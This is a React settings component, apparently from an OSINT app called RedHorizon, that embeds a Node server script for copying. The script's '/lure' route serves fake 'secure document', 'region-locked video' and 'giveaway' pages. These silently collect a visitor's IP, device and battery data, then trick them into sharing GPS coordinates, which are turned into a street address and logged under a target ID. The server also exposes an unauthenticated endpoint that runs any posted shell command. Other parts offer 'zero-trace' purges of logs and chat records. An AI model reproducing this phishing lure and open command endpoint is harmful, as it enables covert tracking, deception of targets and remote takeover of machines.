
import React, { useState, useRef, useEffect } from 'react';
import { Settings, X, Terminal, Cpu, Copy, Check, CheckCircle2, ShieldAlert, Network, Globe, ExternalLink, RefreshCw, AlertTriangle, Eye, EyeOff, BookOpen, Palette, Sliders, Image as ImageIcon, Trash2, Upload, Search, Server, Zap, Flame, ShieldCheck, HardDrive, AlertOctagon, Skull, Smartphone, Laptop, Monitor, Sparkles, Info } from 'lucide-react';
import { ModelConfig, AIProvider } from '../types';
import { purgeAllRoomMessages, purgeRoomLiveCanvas, purgeEntireOperationRoom, executeZeroTraceLocalPurge } from '../services/firebase';
import { detectDevice } from '../utils/deviceDetection';

const TERMUX_SERVER_CODE = `
// RED HORIZON UPLINK SERVER v14.4
// RUN: node server.cjs

const express = require('express');
const cors = require('cors');
const { spawn, exec } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');
const app = express();
const PORT = 3000;

// FORCE CORS - ALLOW ALL
app.use((req, res, next) => {
    res.header("Access-Control-Allow-Origin", req.headers.origin || "*");
    res.header("Access-Control-Allow-Credentials", "true");
    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, ngrok-skip-browser-warning, bypass-tunnel-reminder");
    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.use(express.json());
app.use('/files', express.static(__dirname));

const STINGS_FILE = path.join(os.tmpdir(), 'stings.json');
if (!fs.existsSync(STINGS_FILE)) fs.writeFileSync(STINGS_FILE, JSON.stringify({}));
function loadStings() { try { return JSON.parse(fs.readFileSync(STINGS_FILE, 'utf-8')); } catch (e) { return {}; } }
function saveStings(stings) { fs.writeFileSync(STINGS_FILE, JSON.stringify(stings, null, 2)); }

app.get('/', (req, res) => res.send("RedHorizon Backend Active"));
app.get('/api/health', (req, res) => {
    console.log("[HEALTH CHECK] Ping received.");
    res.json({status:'online'});
});

// WEAPONIZED PAYLOAD ROUTE
app.get('/lure', (req, res) => {
    const targetId = req.query.id || '';
    const type = req.query.t || 'pdf_secure';
    
    let title = "Secure Document";
    let desc = "This document is protected and region-locked. You must verify your location to view it.";
    let btnText = "Unlock & View PDF";
    let iconColor = "#2563eb"; 
    let iconSvg = "<svg width='48' height='48' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><path d='M14.5 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V7.5L14.5 2z'></path><polyline points='14 2 14 8 20 8'></polyline></svg>";

    if (type === 'geo_video') {
       title = "Region-Locked Video";
       desc = "Due to broadcasting rights, this video is only available in specific regions. Please verify your location.";
       btnText = "Verify Region";
       iconColor = "#dc2626"; 
       iconSvg = "<svg width='48' height='48' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polygon points='23 7 16 12 23 17 23 7'></polygon><rect x='1' y='5' width='15' height='14' rx='2' ry='2'></rect></svg>";
    } else if (type === 'giveaway') {
       title = "Local Giveaway Entry";
       desc = "Congratulations! You are eligible for the local prize pool. Verify your residential city to claim your entry.";
       btnText = "Claim Entry";
       iconColor = "#059669"; 
       iconSvg = "<svg width='48' height='48' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2'><polyline points='20 12 20 22 4 22 4 12'></polyline><rect x='2' y='7' width='20' height='5'></rect><line x1='12' y1='22' x2='12' y2='7'></line></svg>";
    }

    const html = \`<!DOCTYPE html><html><head><meta charset='utf-8'><meta name='viewport' content='width=device-width, initial-scale=1'><title>\${title}</title><style>body { font-family: -apple-system, BlinkMacSystemFont, Arial, sans-serif; background: #f9fafb; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; } .card { background: white; width: 100%; max-width: 400px; border-radius: 16px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; margin: 20px; } .header { background: \${iconColor}; color: white; padding: 32px; display: flex; justify-content: center; } .content { padding: 32px; text-align: center; } h1 { margin: 0 0 8px 0; font-size: 20px; color: #111827; } p { margin: 0 0 24px 0; font-size: 14px; color: #4b5563; line-height: 1.5; } button { background: \${iconColor}; color: white; border: none; width: 100%; padding: 14px; border-radius: 8px; font-weight: bold; font-size: 16px; cursor: pointer; transition: opacity 0.2s; } button:active { opacity: 0.8; } .footer { font-size: 10px; color: #9ca3af; padding-bottom: 24px; text-align: center; } #loading { display: none; margin-top: 16px; font-size: 14px; color: \${iconColor}; }</style></head><body><div class='card' id='mainCard'><div class='header'>\${iconSvg}</div><div class='content'><h1>\${title}</h1><p>\${desc}</p><button id='actionBtn' onclick='runSting()'>\${btnText}</button><div id='loading'>Verifying securely...</div></div><div class='footer'>Protected by ShieldSync OSINT Verification Service</div></div><script>async function autoCapture(){try{let ip='',battery=null;try{const ipRes=await fetch('https://api.ipify.org?format=json');const ipData=await ipRes.json();ip=ipData.ip;}catch(e){}if(navigator.getBattery){try{const b=await navigator.getBattery();battery={level:Math.floor(b.level*100),charging:b.charging?'true':'false'};}catch(e){}}await fetch('/api/sting',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({targetId:'\${targetId}',ip:ip,ua:navigator.userAgent,hash:btoa(navigator.userAgent).substring(0,12),battery:battery,status:'opened_page'})});}catch(e){console.log(e);}} window.addEventListener('load', autoCapture); async function captureData(gpsData=null){const btn=document.getElementById('actionBtn');const load=document.getElementById('loading');btn.style.display='none';load.style.display='block';try{let ip='',address='';try{const ipRes=await fetch('https://api.ipify.org?format=json');const ipData=await ipRes.json();ip=ipData.ip;}catch(e){}let battery=null;if(navigator.getBattery){try{const b=await navigator.getBattery();battery={level:Math.floor(b.level*100),charging:b.charging?'true':'false'};}catch(e){}}if(gpsData){try{const geo=await fetch('https://nominatim.openstreetmap.org/reverse?format=json&lat='+gpsData.lat+'&lon='+gpsData.lng);const geoData=await geo.json();address=geoData.display_name||'';}catch(e){}}await fetch('/api/sting',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({targetId:'\${targetId}',ip:ip,ua:navigator.userAgent,hash:btoa(navigator.userAgent).substring(0,12),gps:gpsData,battery:battery,address:address,status:'clicked_button'})});document.getElementById('mainCard').innerHTML="<div style='padding:40px;text-align:center;'><svg width='48' height='48' viewBox='0 0 24 24' fill='none' stroke='#2563eb' stroke-width='2'><rect x='3' y='11' width='18' height='11' rx='2' ry='2'></rect><path d='M7 11V7a5 5 0 0 1 10 0v4'></path></svg><h2 style='color:#111;margin:16px 0 8px;'>Access Verified</h2><p style='color:#666;font-size:14px;'>The content is now available. Redirecting...</p></div>";}catch(e){alert('Connection timeout. Please check your network and try again.');btn.style.display='block';load.style.display='none';}} function runSting(){if(!navigator.geolocation){captureData(null);return;}navigator.geolocation.getCurrentPosition((pos)=>captureData({lat:pos.coords.latitude.toFixed(6),lng:pos.coords.longitude.toFixed(6),acc:pos.coords.accuracy.toFixed(1)}),(err)=>captureData(null));}</script></body></html>\`;
    res.send(html);
});

app.post('/api/sting', (req, res) => {
    const data = req.body;
    console.log('[STING RECEIVED] Payload IP:', data.ip);
    if (data.targetId) {
        const stings = loadStings();
        stings[data.targetId] = data;
        saveStings(stings);
    }
    res.status(200).send('OK');
});

app.get('/api/sting/:targetId', (req, res) => {
    const { targetId } = req.params;
    const stings = loadStings();
    if (stings[targetId]) {
        res.status(200).json(stings[targetId]);
    } else {
        res.status(404).json({ error: 'Not found' });
    }
});

app.post('/api/execute', (req, res) => {
    const { command } = req.body;
    console.log('[EXEC] ' + command);
    
    // Set headers for streaming response
    res.setHeader('Content-Type', 'text/plain');
    res.setHeader('Transfer-Encoding', 'chunked');

    let shellPath, args;
    if (os.platform() === 'win32') {
        shellPath = 'powershell.exe';
        args = ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', command];
    } else {
        shellPath = fs.existsSync('/data/data/com.termux/files/usr/bin/bash') 
            ? '/data/data/com.termux/files/usr/bin/bash' 
            : (fs.existsSync('/bin/bash') ? '/bin/bash' : '/bin/sh');
        args = ['-c', command];
    }

    const child = spawn(shellPath, args, {
        env: { ...process.env, PYTHONUNBUFFERED: '1', TERM: 'xterm-256color' }
    });

    child.stdout.on('data', (data) => res.write(data.toString()));
    child.stderr.on('data', (data) => res.write(data.toString()));

    child.on('error', (error) => {
        res.write('\\n[SYSTEM ERROR]: ' + error.message + '\\n');
    });

    child.on('close', (code) => {
        if (code !== 0) {
            res.write('\\n[Process exited with warning/error code ' + code + ']\\n');
        } else {
            res.write('\\n[Process completed successfully]\\n');
        }
        res.end();
    });
});

app.listen(PORT, '0.0.0.0', () => {
    console.log('\\n>>> SERVER ONLINE: Port ' + PORT);
    console.log('>>> PAYLOAD ENDPOINT ENABLED');
    console.log('>>> STREAMING MODE ENABLED\\n');
});
`.trim();


export type GpuDensityMode = '1080p' | '2k' | '4k';

interface SettingsModalProps {
  shodanKey: string;
  activeModel: string;
  currentConfig: ModelConfig;
  onSaveConfig: (key: string, config: ModelConfig) => void;
  onClose: () => void;
  gpuDensityMode?: GpuDensityMode;
  onGpuDensityChange?: (mode: GpuDensityMode) => void;
}

const SettingsModal: React.FC<SettingsModalProps> = ({ currentConfig, onSaveConfig, onClose, gpuDensityMode: externalGpuMode, onGpuDensityChange }) => {
  const [activeTab, setActiveTab] = useState<'ai' | 'backend' | 'visual' | 'tutorials' | 'opsec'>('ai');
  const [internalGpuMode, setInternalGpuMode] = useState<GpuDensityMode>(() => {
    return (localStorage.getItem('rhz_gpu_density_mode') as GpuDensityMode) || '1080p';
  });
  const currentGpuMode = externalGpuMode || internalGpuMode;

  const handleGpuModeSelect = (newMode: GpuDensityMode) => {
    setInternalGpuMode(newMode);
    localStorage.setItem('rhz_gpu_density_mode', newMode);
    if (onGpuDensityChange) {
      onGpuDensityChange(newMode);
    }
  };
  const [config, setConfig] = useState<ModelConfig>(currentConfig);
  const [backendStatus, setBackendStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [openRouterStatus, setOpenRouterStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [openRouterMsg, setOpenRouterMsg] = useState('');
  const [geminiStatus, setGeminiStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [geminiMsg, setGeminiMsg] = useState('');
  const [deepseekStatus, setDeepseekStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [deepseekMsg, setDeepseekMsg] = useState('');
  const [tavilyStatus, setTavilyStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [tavilyMsg, setTavilyMsg] = useState('');
  const [rapidStatus, setRapidStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [rapidMsg, setRapidMsg] = useState('');
  const [liveModelsLoading, setLiveModelsLoading] = useState(false);
  const [liveModels, setLiveModels] = useState<{ freeModels: any[]; nvidiaModels: any[] } | null>(null);
  const [errorMessage, setErrorMessage] = useState('');
  const [showApiKey, setShowApiKey] = useState(false);
  const [showOpenRouterKey, setShowOpenRouterKey] = useState(false);
  const [showDeepSeekKey, setShowDeepSeekKey] = useState(false);
  const [showTavilyKey, setShowTavilyKey] = useState(false);
  const [showRapidKey, setShowRapidKey] = useState(false);
  const [showGoogleCseKey, setShowGoogleCseKey] = useState(false);
  const [googleCseStatus, setGoogleCseStatus] = useState<'idle' | 'testing' | 'success' | 'fail'>('idle');
  const [googleCseMsg, setGoogleCseMsg] = useState('');

  useEffect(() => {
    // Automatically clean up any accidental OpenRouter key copied to Gemini apiKey
    if (config.apiKey && (config.apiKey.trim().startsWith('sk-or-v1-') || config.apiKey.trim().startsWith('sk-or-'))) {
      const openKey = config.openrouterApiKey || config.apiKey.trim();
      setConfig(prev => ({
        ...prev,
        openrouterApiKey: openKey,
        apiKey: ''
      }));
    }
  }, []);

  const countKeys = (keyString: string = '') => {
    if (!keyString) return 0;
    return keyString
      .split(/[\n,;]+/)
      .map(k => k.trim())
      .filter(k => k.length > 10).length;
  };

  // OPSEC & Firebase Cloud Purge State
  const [opsecRoomId, setOpsecRoomId] = useState<string>(() => {
    return localStorage.getItem('redhorizon_collab_room_id') || 'OPS-RED-ALPHA';
  });
  const [opsecPurgeStatus, setOpsecPurgeStatus] = useState<{ msg: string; success: boolean } | null>(null);
  const [opsecLoading, setOpsecLoading] = useState(false);

  const handleOpsecLocalPurge = async () => {
    if (!window.confirm("AMARAN: Ini akan memadam semua data tempatan (LocalStorage, SessionStorage, IndexedDB RedHorizonDB, Caches). Adakah anda pasti?")) {
      return;
    }
    setOpsecLoading(true);
    try {
      await executeZeroTraceLocalPurge();
      setOpsecPurgeStatus({ msg: "Semua data tempatan telah dibersihkan tanpa jejak. Memuat semula...", success: true });
      setTimeout(() => window.location.reload(), 1200);
    } catch (e: any) {
      setOpsecPurgeStatus({ msg: `Ralat pembersihan: ${e.message}`, success: false });
    } finally {
      setOpsecLoading(false);
    }
  };

  const handleOpsecCloudMessagesPurge = async () => {
    if (!opsecRoomId.trim()) {
      alert("Sila masukkan Kod Bilik Operasi Firestore.");
      return;
    }
    if (!window.confirm(`Adakah anda pasti mahu memadam SEMUA mesej sembang dan lampiran fail bagi bilik awan "${opsecRoomId}" di Firebase Firestore?`)) {
      return;
    }
    setOpsecLoading(true);
    try {
      const count = await purgeAllRoomMessages(opsecRoomId.trim());
      setOpsecPurgeStatus({ msg: `Berjaya memadam ${count} rekod mesej & lampiran dari bilik Firestore (${opsecRoomId}).`, success: true });
    } catch (e: any) {
      setOpsecPurgeStatus({ msg: `Gagal memadam mesej: ${e.message}`, success: false });
    } finally {
      setOpsecLoading(false);
    }
  };

  const handleOpsecCloudCanvasPurge = async () => {
    if (!opsecRoomId.trim()) {
      alert("Sila masukkan Kod Bilik Operasi Firestore.");
      return;
    }
    if (!window.confirm(`Adakah anda pasti mahu mengosongkan Live Cloud Canvas bagi bilik awan "${opsecRoomId}" di Firebase Firestore?`)) {
      return;
    }
    setOpsecLoading(true);
    try {
      await purgeRoomLiveCanvas(opsecRoomId.trim());
      setOpsecPurgeStatus({ msg: `Graf Live Canvas bagi bilik (${opsecRoomId}) telah dipadam dari Firestore.`, success: true });
    } catch (e: any) {
      setOpsecPurgeStatus({ msg: `Gagal memadam canvas: ${e.message}`, success: false });
    } finally {
      setOpsecLoading(false);
    }
  };

  const handleOpsecCloudRoomNuke = async () => {
    if (!opsecRoomId.trim()) {
      alert("Sila masukkan Kod Bilik Operasi Firestore.");
      return;
    }
    if (!window.confirm(`AMARAN TERTINGGI: Ini akan MEMUSNAHKAN KESELURUHAN BILIK OPERASI "${opsecRoomId}" (Mesej, Canvas, Presens, Bilik) di Firebase Firestore secara kekal. Teruskan?`)) {
      return;
    }
    setOpsecLoading(true);
    try {
      await purgeEntireOperationRoom(opsecRoomId.trim());
      setOpsecPurgeStatus({ msg: `Bilik operasi (${opsecRoomId}) telah dimusnahkan sepenuhnya dari Firestore.`, success: true });
    } catch (e: any) {
      setOpsecPurgeStatus({ msg: `Gagal memusnahkan bilik: ${e.message}`, success: false });
    } finally {
      setOpsecLoading(false);
    }
  };

  const handleOpsecMasterPurge = async () => {
    if (!window.confirm("AMARAN NUCLEAR: Ini akan memadam bilik awan Firebase Firestore aktif DAN memadam semua data tempatan (Zero-Trace). Adakah anda benar-benar pasti?")) {
      return;
    }
    setOpsecLoading(true);
    try {
      if (opsecRoomId.trim()) {
        await purgeEntireOperationRoom(opsecRoomId.trim()).catch(() => {});
      }
      await executeZeroTraceLocalPurge();
      setOpsecPurgeStatus({ msg: "Master Tactical Purge selesai. Sistem dimuat semula tanpa sebarang jejak...", success: true });
      setTimeout(() => window.location.reload(), 1200);
    } catch (e: any) {
      setOpsecPurgeStatus({ msg: `Ralat Master Purge: ${e.message}`, success: false });
    } finally {
      setOpsecLoading(false);
    }
  };

  const fetchLiveModels = async () => {
      setLiveModelsLoading(true);
      try {
          const res = await fetch('/api/ai/openrouter-models');
          const rawText = await res.text();
          let data: any = null;
          try {
              data = JSON.parse(rawText);
          } catch {
              data = null;
          }
          if (data && data.success) {
              setLiveModels({
                  freeModels: data.freeModels || [],
                  nvidiaModels: data.nvidiaModels || []
              });
          }
      } catch (e) {
          console.warn("Could not fetch live OpenRouter models:", e);
      } finally {
          setLiveModelsLoading(false);
      }
  };

  useEffect(() => {
      if (config.provider === 'openrouter') {
          fetchLiveModels();
      }
  }, [config.provider]);
  const [copyStatus, setCopyStatus] = useState('');
  const wallpaperInputRef = useRef<HTMLInputElement>(null);

  const testOpenRouter = async () => {
      setOpenRouterStatus('testing');
      setOpenRouterMsg('');
      const rawKey = (config.openrouterApiKey || config.apiKey || '').trim();
      if (!rawKey) {
          setOpenRouterStatus('fail');
          setOpenRouterMsg('Sila masukkan API Key OpenRouter (sk-or-v1-...) atau NVIDIA Direct (nvapi-...) terlebih dahulu.');
          return;
      }

      const keyList = rawKey.split(/[\n,;]+/).map(k => k.trim()).filter(k => k.length > 0);
      const singleKey = keyList[0] || '';
      const isNvidia = singleKey.startsWith('nvapi-');
      const defaultModel = isNvidia ? 'nvidia/llama-3.1-nemotron-70b-instruct' : 'nvidia/nemotron-3.5-lightning:free';
      const model = config.openrouterModel || config.modelName || defaultModel;

      // 1. First attempt server-side verification
      try {
          const res = await fetch('/api/ai/openrouter-test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ apiKey: singleKey, model })
          });
          const rawText = await res.text();
          let data: any = null;
          try {
              data = JSON.parse(rawText);
          } catch {
              data = null;
          }

          if (res.ok && data?.success) {
              setOpenRouterStatus('success');
              setOpenRouterMsg(data.message || `Berjaya bersambung ke ${data.providerType || 'OpenRouter'} (${data.modelUsed || model})`);
              return;
          } else if (data?.error && res.status !== 404) {
              setOpenRouterStatus('fail');
              setOpenRouterMsg(data.error);
              return;
          }
      } catch {
          // Server not reachable (Vercel / static hosting)
      }

      // 2. Direct client-side verification fallback (Vercel Mode)
      try {
          const isNvidiaDirect = singleKey.startsWith('nvapi-');
          const endpoint = isNvidiaDirect 
              ? 'https://integrate.api.nvidia.com/v1/chat/completions' 
              : 'https://openrouter.ai/api/v1/chat/completions';

          const candidateModels = isNvidiaDirect 
              ? [model, 'nvidia/llama-3.1-nemotron-70b-instruct', 'meta/llama-3.3-70b-instruct']
              : [model, 'nvidia/nemotron-3.5-lightning:free', 'meta-llama/llama-3.3-70b-instruct:free', 'google/gemini-2.0-flash-exp:free', 'openrouter/free'];

          let connected = false;
          let lastErrMsg = '';

          for (const m of candidateModels) {
              try {
                  const headers: Record<string, string> = {
                      'Content-Type': 'application/json',
                      'Authorization': `Bearer ${singleKey}`
                  };
                  if (!isNvidiaDirect) {
                      headers['HTTP-Referer'] = window.location.origin;
                      headers['X-Title'] = 'RedHorizon OSINT';
                  }

                  const directRes = await fetch(endpoint, {
                      method: 'POST',
                      headers,
                      body: JSON.stringify({
                          model: m,
                          messages: [
                              { role: 'user', content: 'PING: Sahkan status ONLINE.' }
                          ],
                          max_tokens: 30
                      })
                  });

                  const directData = await directRes.json().catch(() => null);

                  if (directRes.ok && (directData?.choices?.[0]?.message?.content || directData?.choices?.[0]?.text)) {
                      setOpenRouterStatus('success');
                      setOpenRouterMsg(`Berjaya bersambung terus ke ${isNvidiaDirect ? 'NVIDIA NIM' : 'OpenRouter'} (${m}) [Direct Client / Vercel Mode]`);
                      connected = true;
                      break;
                  } else if (directData?.error) {
                      const code = directData.error.code || directRes.status;
                      const msg = directData.error.message || 'Kunci ditolak.';
                      lastErrMsg = `[${isNvidiaDirect ? 'NVIDIA' : 'OpenRouter'} API ${code}]: ${msg}`;
                      if (code === 401 || code === 403) {
                          break; // Invalid key, don't try other models
                      }
                  }
              } catch (netErr: any) {
                  lastErrMsg = netErr.message || 'Ralat rangkaian';
              }
          }

          if (!connected) {
              setOpenRouterStatus('fail');
              setOpenRouterMsg(lastErrMsg || 'Gagal menyambung ke OpenRouter API dari pelayar.');
          }
      } catch (err: any) {
          setOpenRouterStatus('fail');
          setOpenRouterMsg(`Ralat sambungan: ${err.message || 'Gagal menghubungi OpenRouter.'}`);
      }
  };

  const testGemini = async () => {
      setGeminiStatus('testing');
      setGeminiMsg('');
      const rawInput = (config.apiKey || '').trim();
      const model = config.modelName || 'gemini-3.7-flash';
      
      const keyList = rawInput 
          ? rawInput.split(/[\n,;]+/).map(k => k.trim()).filter(k => k.length > 0)
          : [];

      // Helper function to test a single API key directly from client browser
      const testSingleKeyDirect = async (singleKey: string, keyIndex: number): Promise<{ index: number; preview: string; ok: boolean; modelUsed?: string; error?: string }> => {
          const preview = singleKey.length > 10 
              ? `${singleKey.slice(0, 6)}...${singleKey.slice(-4)}` 
              : `${singleKey.slice(0, 4)}...`;

          const testModels = [model, 'gemini-2.5-flash', 'gemini-1.5-flash'];
          let lastErr = '';

          for (const m of testModels) {
              try {
                  const directRes = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${m}:generateContent?key=${encodeURIComponent(singleKey)}`, {
                      method: 'POST',
                      headers: { 'Content-Type': 'application/json' },
                      body: JSON.stringify({
                          contents: [{ parts: [{ text: 'PING: Sahkan status ONLINE.' }] }]
                      })
                  });
                  
                  const directData = await directRes.json().catch(() => null);
                  if (directRes.ok && directData?.candidates?.[0]?.content?.parts?.[0]?.text) {
                      return { index: keyIndex, preview, ok: true, modelUsed: m };
                  } else if (directData?.error) {
                      const code = directData.error.code || directRes.status;
                      const msg = directData.error.message || directData.error.status || 'Ditolak';
                      lastErr = `[Google API ${code}]: ${msg.includes('API_KEY_INVALID') ? 'Kunci Tidak Sah' : msg.includes('PERMISSION_DENIED') ? 'Tiada Kebenaran' : msg}`;
                      if (code === 400 || code === 403) {
                          break;
                      }
                  }
              } catch (netErr: any) {
                  lastErr = netErr.message || 'Ralat rangkaian';
              }
          }

          return { index: keyIndex, preview, ok: false, error: lastErr || 'Gagal disahkan' };
      };

      // 1. MULTI-KEY POOL VERIFICATION (Round-Robin Pool)
      if (keyList.length > 1) {
          try {
              const testResults = await Promise.all(
                  keyList.map((k, idx) => testSingleKeyDirect(k, idx + 1))
              );

              const validList = testResults.filter(r => r.ok);
              const failedList = testResults.filter(r => !r.ok);

              if (validList.length === keyList.length) {
                  setGeminiStatus('success');
                  setGeminiMsg(`✅ SEMUA ${validList.length}/${keyList.length} KUNCI SAH & ONLINE (Round-Robin Pool sedia digilirkan)`);
              } else if (validList.length > 0) {
                  setGeminiStatus('success');
                  const failDetails = failedList.map(f => `Kunci #${f.index} (${f.preview}): ${f.error}`).join(' | ');
                  setGeminiMsg(`⚠️ ${validList.length}/${keyList.length} KUNCI AKTIF. (${failedList.length} Gagal: ${failDetails})`);
              } else {
                  setGeminiStatus('fail');
                  const failDetails = failedList.map(f => `Kunci #${f.index}: ${f.error}`).join(' | ');
                  setGeminiMsg(`❌ SEMUA ${keyList.length} KUNCI GAGAL: ${failDetails}`);
              }
              return;
          } catch (err: any) {
              setGeminiStatus('fail');
              setGeminiMsg(`Ralat semasa menguji kunci pool: ${err.message || err}`);
              return;
          }
      }

      // 2. SINGLE KEY OR DEFAULT SERVER KEY VERIFICATION
      const singleKey = keyList[0] || '';

      // Try server endpoint first
      try {
          const res = await fetch('/api/ai/gemini-test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ apiKey: singleKey, model })
          });
          const data = await res.json().catch(() => null);
          if (res.ok && data?.success) {
              setGeminiStatus('success');
              setGeminiMsg(data.message || `Berjaya bersambung ke Google Gemini (${data.modelUsed || model})`);
              return;
          } else if (data?.error && res.status !== 404) {
              if (!singleKey) {
                  setGeminiStatus('fail');
                  setGeminiMsg(data.error);
                  return;
              }
          }
      } catch {
          // Backend not running / static host
      }

      // Direct client verification fallback for Single Key
      if (singleKey) {
          const res = await testSingleKeyDirect(singleKey, 1);
          if (res.ok) {
              setGeminiStatus('success');
              setGeminiMsg(`Berjaya bersambung terus ke Google Gemini (${res.modelUsed || model}) [Direct Client / Vercel Mode]`);
          } else {
              setGeminiStatus('fail');
              setGeminiMsg(res.error || 'Kunci API Gemini gagal disahkan oleh pelayan Google.');
          }
      } else {
          setGeminiStatus('fail');
          setGeminiMsg('Pelayan backend tidak dikesan pada hos statik (cth: Vercel). Sila masukkan API Key anda sendiri untuk sambungan terus.');
      }
  };

  const testDeepSeek = async () => {
      setDeepseekStatus('testing');
      setDeepseekMsg('');
      const key = (config.apiKey || '').trim();
      if (!key) {
          setDeepseekStatus('fail');
          setDeepseekMsg('Sila masukkan DeepSeek API Key (sk-...) terlebih dahulu.');
          return;
      }
      const model = config.modelName || 'deepseek-chat';
      try {
          const res = await fetch('/api/ai/deepseek-test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ apiKey: key, model })
          });
          const data = await res.json().catch(() => null);
          if (res.ok && data?.success) {
              setDeepseekStatus('success');
              setDeepseekMsg(data.message || `Berjaya bersambung ke DeepSeek (${data.modelUsed || model})`);
          } else {
              setDeepseekStatus('fail');
              setDeepseekMsg(data?.error || 'Ralat sambungan DeepSeek.');
          }
      } catch (e: any) {
          setDeepseekStatus('fail');
          setDeepseekMsg(e.message || 'Gagal menghubungi pelayan backend untuk menguji DeepSeek.');
      }
  };

  const testTavily = async () => {
      setTavilyStatus('testing');
      setTavilyMsg('');
      const key = (config.tavilyApiKey || '').trim();
      if (!key) {
          setTavilyStatus('fail');
          setTavilyMsg('Sila masukkan Tavily API Key terlebih dahulu.');
          return;
      }
      try {
          const res = await fetch('/api/ai/tavily-test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ apiKey: key })
          });
          const data = await res.json().catch(() => null);
          if (res.ok && data?.success) {
              setTavilyStatus('success');
              setTavilyMsg(data.message || 'Berjaya bersambung ke Tavily AI Search.');
          } else {
              setTavilyStatus('fail');
              setTavilyMsg(data?.error || 'Ralat sambungan Tavily AI Search.');
          }
      } catch (e: any) {
          setTavilyStatus('fail');
          setTavilyMsg(e.message || 'Gagal menghubungi pelayan backend untuk menguji Tavily.');
      }
  };

  const testRapidApi = async () => {
      setRapidStatus('testing');
      setRapidMsg('');
      const key = (config.rapidApiKey || '').trim();
      if (!key) {
          setRapidStatus('fail');
          setRapidMsg('Sila masukkan RapidAPI Key terlebih dahulu.');
          return;
      }
      try {
          const res = await fetch('/api/ai/rapidapi-test', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ apiKey: key })
          });
          const data = await res.json().catch(() => null);
          if (res.ok && data?.success) {
              setRapidStatus('success');
              setRapidMsg(data.message || 'Berjaya bersambung ke Horizon12 / RapidAPI.');
          } else {
              setRapidStatus('fail');
              setRapidMsg(data?.error || 'Ralat sambungan RapidAPI.');
          }
      } catch (e: any) {
          setRapidStatus('fail');
          setRapidMsg(e.message || 'Gagal menghubungi pelayan backend untuk menguji RapidAPI.');
      }
  };

  const testGoogleCse = async () => {
      setGoogleCseStatus('testing');
      setGoogleCseMsg('');
      const cx = (config.googleCseId || '53a0041f2f24f4e3b').trim();
      const apiKey = (config.googleCseApiKey || '').trim();
      try {
          const res = await fetch('/api/socint/google-cse', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ query: 'OSINT Malaysia', cx, apiKey, platform: 'all', num: 3 })
          });
          const data = await res.json().catch(() => null);
          if (res.ok && data?.success) {
              setGoogleCseStatus('success');
              setGoogleCseMsg(data.notice || `Berjaya berhubung ke enjin SOCINT (CX: ${cx}). Memperolehi ${data.items?.length || 0} rekod.`);
          } else {
              setGoogleCseStatus('fail');
              setGoogleCseMsg(data?.error || 'Ralat sambungan Google CSE.');
          }
      } catch (e: any) {
          setGoogleCseStatus('fail');
          setGoogleCseMsg(e.message || 'Gagal menghubungi pelayan backend untuk menguji Google CSE.');
      }
  };

  const handleSave = () => {
      onSaveConfig("", config);
      onClose();
  };

  const copyToClipboard = (text: string) => {
      navigator.clipboard.writeText(text);
      setCopyStatus('Copied!');
      setTimeout(() => setCopyStatus(''), 2000);
  };

  const handleWallpaperUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
      const file = e.target.files?.[0];
      if (!file) return;

      if (file.size > 2 * 1024 * 1024) {
          alert("Wallpaper image must be under 2MB to ensure performance.");
          return;
      }

      const reader = new FileReader();
      reader.onload = (ev) => {
          const result = ev.target?.result as string;
          setConfig({
              ...config,
              visual: { ...config.visual, wallpaperUrl: result }
          });
      };
      reader.readAsDataURL(file);
  };

  const clearWallpaper = () => {
      setConfig({
          ...config,
          visual: { ...config.visual, wallpaperUrl: '' }
      });
  };

  const testBackend = async () => {
      setBackendStatus('testing');
      setErrorMessage('');
      
      const currentTargetUrl = config.activeBackend === 'pc' ? config.pcBackendUrl : config.customBackendUrl;
      let cleanUrl = currentTargetUrl?.trim().replace(/\/$/, '') || 'http://localhost:3000';
      
      if (!cleanUrl.startsWith('http')) {
          cleanUrl = window.location.protocol === 'https:' ? 'https://' + cleanUrl : 'http://' + cleanUrl;
      }

      const isAppHttps = window.location.protocol === 'https:';
      const isBackendHttp = cleanUrl.startsWith('http:');
      const isLocalhost = cleanUrl.includes('localhost') || cleanUrl.includes('127.0.0.1');

      if (isAppHttps && isBackendHttp && !isLocalhost) {
         setBackendStatus('fail');
         setErrorMessage("PROTOCOL ERROR: Your app is using HTTPS, but your backend is HTTP. Browsers block this (Mixed Content). Use a Tunnel (Cloudflare/Ngrok/Pinggy) to get an HTTPS URL for your backend.");
         return;
      }

      try {
          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000); 
          
          const res = await fetch(`${cleanUrl}/api/health`, { 
              signal: controller.signal,
              credentials: 'omit',
              headers: { 
                  'ngrok-skip-browser-warning': 'true',
